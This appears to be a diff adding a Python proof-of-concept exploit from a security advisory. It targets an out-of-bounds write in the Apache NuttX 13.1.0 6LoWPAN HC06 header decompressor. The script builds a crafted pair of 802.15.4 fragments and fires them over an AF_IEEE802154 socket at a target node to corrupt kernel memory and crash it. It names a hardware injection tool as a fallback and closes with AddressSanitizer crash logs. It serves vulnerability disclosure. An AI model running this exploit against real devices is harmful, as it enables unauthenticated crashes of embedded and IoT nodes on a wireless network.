@@ -1,0 +1,334 @@
+#!/usr/bin/env python
+#
+#
+# Apache NuttX RTOS 13.1.0 6LoWPAN HC06 Decompressor Kernel Out-of-Bounds Write
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://nuttx.apache.org
+# Affected version: 13.1.0
+#
+# Summary: Apache NuttX is a free and open-source (FOSS) real-time operating
+# system (RTOS) with an emphasis on standards compliance and small footprint.
+# Scalable from 8-bit to 64-bit microcontroller environments, the primary governing
+# standards in NuttX are POSIX and ANSI standards. Additional standard APIs
+# from Unix and other common RTOS's (such as VxWorks) are adopted for functionality
+# not available under these standards, or for functionality that is not appropriate
+# for deeply-embedded environments (such as fork()).
+#
+# Desc: Apache NuttX RTOS contains an out-of-bounds write in the 6LoWPAN RFC
+# 6282 (IPHC/HC06) header decompressor in net/sixlowpan/sixlowpan_hc06.c. The
+# HC06 compressor guards all UDP handling with #ifdef CONFIG_NET_UDP, but the
+# decompressor sixlowpan_uncompresshdr_hc06() has no such guard: its UDP-NHC
+# (next-header compression) reconstruction is compiled unconditionally and writes
+# a reconstructed UDP header at the fixed offset bptr + IPv6_HDRLEN (the destination
+# buffer start + 40 bytes). For a subsequent-fragment (FRAGN) frame, net/sixlowpan/sixlowpan_input.c
+# sets that destination to the static buffer g_bitbucket, whose size UNCOMP_MAXHDR
+# is derived from the configured transport protocols (IPv6_HDRLEN + TCP/UDP/ICMPv6
+# header length, or IPv6_HDRLEN alone when none is enabled). Because NET_6LOWPAN
+# depends only on NET_IPv6 and HC06 has no UDP dependency in Kconfig, a build
+# may enable HC06 while leaving UDP and TCP disabled; UNCOMP_MAXHDR is then 44
+# bytes (ICMPv6 only) or 40 bytes (none), smaller than the 48 bytes the UDP-header
+# write requires.
+#
+# An on-link attacker on the 802.15.4 / packet-radio network (no authentication)
+# sends a valid first fragment (FRAG1) to allocate the reassembly state, then a
+# crafted subsequent fragment (FRAGN) whose continuation bytes form an IPHC dispatch
+# with the next-header-compressed bit set and a UDP-NHC pattern. The decompressor
+# runs against g_bitbucket and writes the attacker-controlled UDP source/destination
+# ports and checksum 2 to 6 bytes past the end of the static buffer, corrupting
+# adjacent kernel .bss memory. This can result is memory corruption and a likely
+# crash.
+#
+# Tested on: Kali Linux (x86-64)
+#            gcc 14.2.0
+#            libasan
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6019
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6019
+#
+#
+# 13.10.2026
+#
+
+
+import ctypes.util
+import ctypes#////
+import socket#////
+import struct#////
+import os#////////
+import sys#///////
+
+r"""
+CWE-787 out-of-bounds write in net/sixlowpan/sixlowpan_hc06.c (sixlowpan_uncompresshdr_hc06).
+Vulnerable targets: a NuttX node on the 802.15.4 / 6LoWPAN link built with
+CONFIG_NET_6LOWPAN_COMPRESSION_HC06=y  and  CONFIG_NET_UDP / CONFIG_NET_TCP UNSET.
+(Enabling UDP or TCP grows g_bitbucket to 48 bytes - enough to hold the reconstructed UDP header - so the
+write stays in bounds; only builds with BOTH disabled are vulnerable.)
+
+How it works - two frames, no auth, link-local:
+  1. FRAG1  : a well-formed RFC-4944 first fragment that makes the target allocate a reassembly node
+              (keyed on datagram tag + our source address).
+  2. FRAGN  : a crafted subsequent fragment. sixlowpan_input routes FRAGN decompression output to the
+              fixed-size static buffer g_bitbucket, and our continuation bytes form an RFC-6282 IPHC header
+              with NH=1 + a UDP-NHC dispatch. The decompressor reconstructs a UDP header at g_bitbucket +
+              IPv6_HDRLEN (offset 40), writing our ports+checksum 2..8 bytes past the end of the 40/44-byte
+              buffer -> kernel .bss corruption -> crash / DoS on the device.
+
+Delivery: a real IEEE 802.15.4 DGRAM socket (AF_IEEE802154) via ctypes - the kernel frames the MAC header
+and transmits our 6LoWPAN payload exactly as a peer node would. No scapy, stdlib only. Needs a configured
+802.15.4 interface (real transceiver or mac802154_hwsim) and CAP_NET_RAW (run as root). If the socket path
+is unavailable, the crafted frames are written to .bin for a hardware injector (KillerBee kbsendp, etc.).
+"""
+
+# ============================ target ============================
+IFACE       = "wpan0"      # local 802.15.4 interface used to transmit
+PANID       = 0xabcd       # target PAN id
+DST_SHORT   = 0x0001       # target node short address
+# ======================= 6LoWPAN datagram =======================
+DGRAM_SIZE  = 96           # RFC-4944 datagram size (FRAG1 and FRAGN must agree)
+DGRAM_TAG   = 0x1234       # reassembly tag         (FRAG1 and FRAGN must agree)
+FRAGN_OFF   = 1            # FRAGN datagram offset, 8-byte units (irrelevant to the overflow)
+# ============ attacker bytes that land past g_bitbucket =========
+SRCPORT     = b"\xde\xad"  # -> g_bitbucket[40..42]
+DSTPORT     = b"\xbe\xef"  # -> g_bitbucket[42..44]
+CHKSUM      = b"\xca\xfe"  # -> g_bitbucket[46..48]   (first OOB byte on a 44-byte buffer)
+
+# --- RFC-4944 fragmentation dispatch (include/nuttx/net/sixlowpan.h) ---
+FRAG1_DISP, FRAGN_DISP = 0xc0, 0xe0
+# --- RFC-6282 IPHC header tuned to reach the UDP-NHC block with zero inline address bytes ---
+#   iphc0 = IPHC(0x60) | TC elided(0x18) | NH compressed(0x04) | HLIM=64(0x02) = 0x7e
+#   iphc1 = SAM_0(0x30) | DAM_0(0x03)                                          = 0x33  (addrs from MAC)
+#   nhc   = UDP ID(0xf0), CS_P_00 (all ports inline), checksum included
+IPHC0, IPHC1, NHC = 0x7e, 0x33, 0xf0
+
+def iphc_packet():
+    """The compressed 'IPv6 packet' the fragment carries. The source-address path does
+    HC06_CHECK(g_hc06ptr, 16, endofframe) at iphc[2]; SAM_0 consumes no inline bytes, so we pad to keep
+    >= 16 bytes available from iphc[2] (harmless trailing bytes the UDP block never reads)."""
+    core = bytes([IPHC0, IPHC1, NHC]) + SRCPORT + DSTPORT + CHKSUM
+    return core + b"\x00" * (2 + 18 - len(core))
+
+
+def frag1(p):
+    return bytes([FRAG1_DISP | ((DGRAM_SIZE >> 8) & 7), DGRAM_SIZE & 0xff,
+                  (DGRAM_TAG >> 8) & 0xff, DGRAM_TAG & 0xff]) + p
+
+
+def fragn(p):
+    return bytes([FRAGN_DISP | ((DGRAM_SIZE >> 8) & 7), DGRAM_SIZE & 0xff,
+                  (DGRAM_TAG >> 8) & 0xff, DGRAM_TAG & 0xff, FRAGN_OFF & 0xff]) + p
+
+
+# ------------------- real AF_IEEE802154 sender (ctypes, no scapy) -------------------
+AF_IEEE802154         = 36
+IEEE802154_ADDR_SHORT = 2
+
+class _AddrU(ctypes.Union):
+    _fields_ = [("hwaddr", ctypes.c_uint8 * 8), ("short_addr", ctypes.c_uint16)]
+
+class ieee802154_addr_sa(ctypes.Structure):
+    _fields_ = [("addr_type", ctypes.c_int), ("pan_id", ctypes.c_uint16), ("u", _AddrU)]
+
+class sockaddr_ieee802154(ctypes.Structure):          # include/net/af_ieee802154.h
+    _fields_ = [("family", ctypes.c_uint16), ("addr", ieee802154_addr_sa)]
+
+
+def deliver(frames):
+    """Transmit each 6LoWPAN payload as an 802.15.4 data frame to DST_SHORT@PANID over IFACE.
+    The kernel 802.15.4 stack builds the MAC header; we supply the adaptation-layer bytes - exactly the
+    on-air frame a peer 6LoWPAN node would send to the target's sixlowpan_input()."""
+    try:
+        s = socket.socket(AF_IEEE802154, socket.SOCK_DGRAM)
+    except OSError as e:
+        print("[-] AF_IEEE802154 socket unavailable (%s)" % e); return False
+
+    dst = sockaddr_ieee802154()
+    dst.family            = AF_IEEE802154
+    dst.addr.addr_type    = IEEE802154_ADDR_SHORT
+    dst.addr.pan_id       = PANID
+    dst.addr.u.short_addr = DST_SHORT
+
+    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
+    try:
+        s.bind((IFACE,))
+    except Exception:
+        pass
+    ok = True
+    for name, buf in frames:
+        n = libc.sendto(s.fileno(), buf, len(buf), 0, ctypes.byref(dst), ctypes.sizeof(dst))
+        if n == len(buf):
+            print("[+] sent %-5s -> %04x@%04x on %s (%d bytes)" % (name, DST_SHORT, PANID, IFACE, n))
+        else:
+            print("[-] send %s failed: %s" % (name, os.strerror(ctypes.get_errno()))); ok = False
+    s.close()
+    return ok
+
+def save(name, data):
+    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
+    open(path, "wb").write(data)
+    print("    %-22s %s" % (name, data.hex()))
+
+
+BANNAH = r"""
+       /\
+      /  \
+     / /\ \         Apache NuttX RTOS v13.1.0
+    / /  \ \        6LoWPAN HC06 Decompressor
+   / /    \ \       Kernel Out-of-Bounds Write
+  / /  /\  \ \
+ / /  /  \  \ \         ID: ZSL-2026-6019
+ \ \  \  /  / /         
+  \ \  \/  / /       https://zeroscience.mk
+   \ \    / /
+    \ \  / /
+     \ \/ /
+      \  /
+       \/
+"""
+
+if __name__ == "__main__":
+    print(BANNAH)
+    p  = iphc_packet()
+    f1 = frag1(p)
+    fn = fragn(p)
+
+    print("[*] target: node %04x  pan %04x  via %s" % (DST_SHORT, PANID, IFACE))
+    print("[*] payload: iphc0=%#x iphc1=%#x nhc=%#x  ports=%s/%s cksum=%s"
+          % (IPHC0, IPHC1, NHC, SRCPORT.hex(), DSTPORT.hex(), CHKSUM.hex()))
+    print("[*] frames:")
+    save("hc06_frag1.bin", f1)
+    save("hc06_fragn.bin", fn)
+
+    print("[*] firing over the 802.15.4 link ...")
+    if not deliver([("FRAG1", f1), ("FRAGN", fn)]):
+        print("[-] over-the-air send unavailable; inject the saved .bin with a PHY tool, e.g.:")
+        print("      kbsendp hc06_frag1.bin ; kbsendp hc06_fragn.bin   (KillerBee)")
+        sys.exit(1)
+
+    print("[+] delivered. On a vulnerable build the FRAGN overflows g_bitbucket+40 with"
+          " %s%s%s -> kernel .bss corruption / crash." % (SRCPORT.hex(), DSTPORT.hex(), CHKSUM.hex()))
+
+"""
+=== Apache NuttX 6LoWPAN HC06 decompressor OOB write - ASan repro (2026-10-13T15:29:47Z) ===
+source: https://raw.githubusercontent.com/apache/nuttx/nuttx-13.1.0/net/sixlowpan/sixlowpan_hc06.c
+
+----- g_bitbucket size 48 : CONTROL (UDP/TCP build) - expected SAFE -----
+[*] calling real sixlowpan_uncompresshdr_hc06() with g_bitbucket size = 48
+    (UDP header will be written at bptr+40; udpchksum at bptr+46)
+[+] decompressor returned 0, g_uncomp_hdrlen=48 -- write stayed in bounds (size=48 SAFE)
+   -> clean (rc=0), as expected
+
+----- g_bitbucket size 44 : ICMPv6-only, no UDP/TCP - expected OOB WRITE -----
+[*] calling real sixlowpan_uncompresshdr_hc06() with g_bitbucket size = 44
+    (UDP header will be written at bptr+40; udpchksum at bptr+46)
+=================================================================
+==181160==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7b95d9be003e at pc 0x5597257c2693 bp 0x7ffcfffe9d10 sp 0x7ffcfffe9d08
+WRITE of size 2 at 0x7b95d9be003e thread T0
+    #0 0x5597257c2692 in sixlowpan_uncompresshdr_hc06 /home/lqwrm/nuttx/hc06_asan_build/sixlowpan_hc06.c:1142
+    #1 0x5597257c30ac in main /home/lqwrm/nuttx/hc06_asan_build/harness.c:45
+    #2 0x7f55da831f76  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f76) (BuildId: e0715e6b2fc508102cc2100d3d25a1aa4eb676f9)
+    #3 0x7f55da832026 in __libc_start_main (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a026) (BuildId: e0715e6b2fc508102cc2100d3d25a1aa4eb676f9)
+    #4 0x5597257c01b0 in _start (/home/lqwrm/nuttx/hc06_asan_build/hc06_asan+0x21b0) (BuildId: 6383258d4e97d06e47d627a17d8e303fae4ac08f)
+
+0x7b95d9be003e is located 2 bytes after 44-byte region [0x7b95d9be0010,0x7b95d9be003c)
+allocated by thread T0 here:
+    #0 0x7f55dab2435f in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:67
+    #1 0x5597257c3006 in main /home/lqwrm/nuttx/hc06_asan_build/harness.c:38
+    #2 0x7f55da831f76  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f76) (BuildId: e0715e6b2fc508102cc2100d3d25a1aa4eb676f9)
+    #3 0x7ffcfffec1b6  (<unknown module>)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /home/lqwrm/nuttx/hc06_asan_build/sixlowpan_hc06.c:1142 in sixlowpan_uncompresshdr_hc06
+Shadow bytes around the buggy address:
+  0x7b95d9bdfd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x7b95d9bdfe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x7b95d9bdfe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x7b95d9bdff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x7b95d9bdff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x7b95d9be0000: fa fa 00 00 00 00 00[04]fa fa fa fa fa fa fa fa
+  0x7b95d9be0080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x7b95d9be0100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x7b95d9be0180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x7b95d9be0200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x7b95d9be0280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==181160==ABORTING
+   -> ASan reported heap-buffer-overflow (rc=99) - OOB WRITE CONFIRMED
+
+----- g_bitbucket size 40 : no UDP/TCP/ICMPv6 - expected OOB WRITE (worse) -----
+[*] calling real sixlowpan_uncompresshdr_hc06() with g_bitbucket size = 40
+    (UDP header will be written at bptr+40; udpchksum at bptr+46)
+=================================================================
+==181168==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7bf61cfe0038 at pc 0x562a82c23e41 bp 0x7ffdefaf5bb0 sp 0x7ffdefaf5ba8
+WRITE of size 2 at 0x7bf61cfe0038 thread T0
+    #0 0x562a82c23e40 in sixlowpan_uncompresshdr_hc06 /home/lqwrm/nuttx/hc06_asan_build/sixlowpan_hc06.c:1065
+    #1 0x562a82c250ac in main /home/lqwrm/nuttx/hc06_asan_build/harness.c:45
+    #2 0x7fb61dc31f76  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f76) (BuildId: e0715e6b2fc508102cc2100d3d25a1aa4eb676f9)
+    #3 0x7fb61dc32026 in __libc_start_main (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a026) (BuildId: e0715e6b2fc508102cc2100d3d25a1aa4eb676f9)
+    #4 0x562a82c221b0 in _start (/home/lqwrm/nuttx/hc06_asan_build/hc06_asan+0x21b0) (BuildId: 6383258d4e97d06e47d627a17d8e303fae4ac08f)
+
+0x7bf61cfe0038 is located 0 bytes after 40-byte region [0x7bf61cfe0010,0x7bf61cfe0038)
+allocated by thread T0 here:
+    #0 0x7fb61df2435f in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:67
+    #1 0x562a82c25006 in main /home/lqwrm/nuttx/hc06_asan_build/harness.c:38
+    #2 0x7fb61dc31f76  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f76) (BuildId: e0715e6b2fc508102cc2100d3d25a1aa4eb676f9)
+    #3 0x7ffdefaf81b6  (<unknown module>)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /home/lqwrm/nuttx/hc06_asan_build/sixlowpan_hc06.c:1065 in sixlowpan_uncompresshdr_hc06
+Shadow bytes around the buggy address:
+  0x7bf61cfdfd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x7bf61cfdfe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x7bf61cfdfe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x7bf61cfdff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x7bf61cfdff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x7bf61cfe0000: fa fa 00 00 00 00 00[fa]fa fa fa fa fa fa fa fa
+  0x7bf61cfe0080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x7bf61cfe0100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x7bf61cfe0180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x7bf61cfe0200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x7bf61cfe0280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==181168==ABORTING
+   -> ASan reported heap-buffer-overflow (rc=99) - OOB WRITE CONFIRMED
+"""
